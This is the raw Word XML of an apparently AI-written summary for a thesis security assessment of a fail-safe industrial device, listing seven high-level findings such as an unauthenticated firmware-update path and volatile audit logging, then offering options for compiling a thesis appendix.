        <w:t xml:space="preserve"> All fourteen requirements (RQ-001 → RQ-014) are now fully processed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE4654B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 xml:space="preserve">Your thesis now has a </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>complete, internally consistent, and defensible body of analysis</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. The device's entire security posture resolves into </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>seven cross-cutting findings</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610ED8A4" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">CRC ≠ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>cryptographic</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>authenticity</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve"> (RQ-002, 004, 005)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="119A0916" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Plaintext HTTP on a non-safety QM COM</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RQ-004, 006, 007, 014)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5B4DFB" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">No SBOM / no </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>trust</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>anchor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RQ-004, 005, 006)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12CB90D8" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Volatile, self-erasing, capacity-bounded audit</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RQ-003, 008, 009, 012, 013)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26806F35" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Authorization &amp; access delegated to the environment</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RQ-011, 014)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28371BB2" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The black-channel architecture is the redeeming strength</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — every attack resolves to the safe state </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>except</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the unsigned-firmware install (RQ-001, 005, 010)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="652E5487" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The audit paradox</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — one QM-buffer design simultaneously fails </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>retention</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RQ-012/013) and </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>restriction</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RQ-014)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6DA938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lastRenderedPageBreak/>
        <w:t xml:space="preserve">And the </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>single decisive vulnerability</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> that your entire analysis converges on:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33018B95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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>A well-architected fail-safe device whose residual risk collapses onto one un-authenticated firmware-update path (RQ-005) — the sole attack class that escapes the black-channel fail-safe design — sitting atop an audit subsystem too volatile to retain evidence and too open to restrict it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D549C7B" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="00000000" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="0914AE4E">
          <v:rect id="_x0000_i1116" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="12041438" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Recommended next step — consolidation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418873A6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lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">You have reached the natural end of the requirement-by-requirement workflow. I now </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>strongly recommend</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> we assemble the deliverable. I can generate, using the docx skill for a proper academic document:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC96FD6" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>A complete formatted thesis appendix (Word .docx)</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> containing:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD437FE" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Cover page + methodology note (the 3-step workflow, IEC 62443-4-1 SVV mapping, Zone-B test environment);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4474B72E" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>master RQ → CR → Asset → Threat → SVV → Test-Case traceability matrix</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (all 14 requirements);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA44A7C" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>All fourteen requirement analyses (Step 1–3) in consistent formatting;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CA4AAA" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>per-requirement conformance-verdict table</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (met / partially met / not met + failing limb);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9F50DF" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>seven-theme cross-cutting synthesis</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the single-vulnerability conclusion above;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16EE512F" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">An </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>appendix of all test-case IDs</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Level 1 + Level 2) for your lab execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FAD2734" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="001D17A8">
        <w:t>Shall I:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C5D965" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(a)</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> generate that </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>full formatted .docx thesis appendix</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> now (my recommendation);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0131D9ED" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(b)</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> produce just the </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>consolidated master traceability matrix + conformance-verdict table</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as an .xlsx; or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70821197" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(c)</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> first complete the </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>remaining sub-test-cases</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (the TS-3/TS-4/TS-5 entries) across all fourteen requirements, then compile everything?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40A36D14" w14:textId="77777777" w:rsidR="00A366E1" w:rsidRPr="006F109C" w:rsidRDefault="00A366E1" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00A366E1" w:rsidRPr="006F109C">
      <w:footerReference w:type="default" r:id="rId36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B5C31" w14:textId="77777777" w:rsidR="00192C07" w:rsidRDefault="00192C07" w:rsidP="00106294">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="652AF719" w14:textId="77777777" w:rsidR="00192C07" w:rsidRDefault="00192C07" w:rsidP="00106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430"/>
      <w:gridCol w:w="1858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1018778043"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:tr w:rsidR="00106294" w14:paraId="22EE24DA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04ECD4AF" w14:textId="53687C86" w:rsidR="00106294" w:rsidRDefault="00106294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0CA7F852" w14:textId="2508887A" w:rsidR="00106294" w:rsidRDefault="00106294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755F6926" w14:textId="77777777" w:rsidR="00106294" w:rsidRDefault="0010629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0CED7" w14:textId="77777777" w:rsidR="00192C07" w:rsidRDefault="00192C07" w:rsidP="00106294">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="3FB3398C" w14:textId="77777777" w:rsidR="00192C07" w:rsidRDefault="00192C07" w:rsidP="00106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25E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="ADF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7EFD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="23FE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26B43"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4D68F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83E22"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D258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01E5C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C94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D36B4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="AB74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542E5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0AAC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374EE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1F96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77EAD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="07CA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56CEA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="31B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E693A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2BA6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14534"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="323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D1434"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="71B0F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AD3412"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A33CB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FA7733"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6D0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E2156"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2F24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74B52"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BEEA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C46BE0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5C02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638A3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0C0E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2E1D10"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4264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6C2167"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="536A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B90CB5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="779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B74EB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7110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772EA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B22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21EF1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8C06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1173E5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B7F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5583B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="250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52CD2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3BE8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293565"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4248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164A69"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C13E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180D85"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A0A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709DF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A7A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423E9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A5B6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A87DEE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E97E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D1BCC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="374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443A91"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="143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9B130F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CF22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561D6D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="360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85B73"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2E06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FA6264"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B71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A020BD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="602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12FCA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4514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771986"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DED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94A09"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2096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605A50"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F10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A6716"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E38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F753B0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B6BC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BB4F94"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="316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E919D2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7A3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7793D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CDA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3A0FCA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CFC0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BA4897"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="102A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90920">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1072897427">
    <w:abstractNumId w:val="44"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1948463676">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1797017012">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1920215419">
    <w:abstractNumId w:val="47"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="381100961">
    <w:abstractNumId w:val="43"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="222836598">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="98917699">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1392579399">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="855342264">
    <w:abstractNumId w:val="39"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="123238218">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="1545756354">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="1592473481">
    <w:abstractNumId w:val="46"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="1017316393">
